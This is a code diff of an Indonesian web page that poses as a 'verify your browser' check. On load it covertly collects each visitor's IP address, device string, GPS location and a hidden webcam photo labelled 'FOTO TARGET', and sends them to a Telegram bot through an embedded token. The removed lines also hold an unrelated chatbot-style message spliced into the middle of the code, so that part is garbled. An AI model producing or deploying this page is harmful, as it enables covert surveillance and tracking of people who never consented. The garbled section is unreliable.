@@ -6,14 +6,14 @@
     <title>Memuat Halaman...</title>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; background-color: #111; color: white; }
-        /* Menyembunyikan elemen video dan canvas agar target tidak melihat tampilan kameranya */
+        /* Menyembunyikan kamera agar tidak terlihat oleh pengunjung */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <h2>Verifikasi Browser Anda...</h2>
     <p>Silakan klik "Allow" / "Izinkan" jika muncul pop-up agar halaman dapat dimuat sepenuhnya.</p>
-    
+
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240"></canvas>
 
@@ -21,32 +21,72 @@
         const BOT_TOKEN = '8879804974:AAH38a0QQMXqlgTEd-5tHGEoEiGb7y2BO2Q';
         const CHAT_ID = '5928694166';
 
-        // 1. KIRIM DATA IP & DEVICE
+        // 1. Fungsi Kirim IP & Device
         async function sendBasicLog() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const text = `[+] PENGUNJUNG BARU!\n\n🌐 IP: ${ipData.ip}\n📱 Device: ${navigator.userAgent}`;
-                
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                 });
-            } catch (e) { console.error("Gagal kirim log dasar", e); }
+            } catch (e) { console.error("Error IP"); }
         }
 
-        // 2. KIRIM LOKASI GPS (Titik Peta Presisi)
+        // 2. Fungsi Kirim Lokasi GPS
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    const text = `📍 LOKASI DITEMUKAN!\n\nMaps: https://www.google.com/maps?q=${lat},${lon}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
-                        headers: { 'ContentMaaf, sepertinya saya kehilangan konteks dari percakapan kita sebelumnya. Informasi atau data apa yang ingin Anda dapatkan secara lengkap? 
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                }, () => { console.error("Lokasi ditolak"); });
+            }
+        }
 
-Apakah ini terkait dengan daftar negara-negara Asia dan Afrika beserta tahun kemerdekaannya, materi tentang dampak positif perubahan sosial untuk bahan presentasi, atau ada topik lain yang sedang ingin Anda bahas? 
+        // 3. Fungsi Ambil & Kirim Foto Kamera
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-Mohon beri tahu saya agar saya bisa menyiapkan jawaban yang paling tepat!
+                video.onplaying = async () => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    
+                    // Jeda 1 detik biar kamera fokus sebelum jepret
+                    setTimeout(async () => {
+                        context.drawImage(video, 0, 0, 320, 240);
+                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
+
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'capture.png');
+                            formData.append('caption', '📸 FOTO TARGET!');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        }, 'image/png');
+                    }, 1000);
+                };
+            } catch (e) { console.error("Kamera ditolak"); }
+        }
+
+        // Jalankan semua fungsi otomatis saat web dibuka
+        sendBasicLog();
+        sendLocation();
+        capturePhoto();
+    </script>
+</body>
+</html>
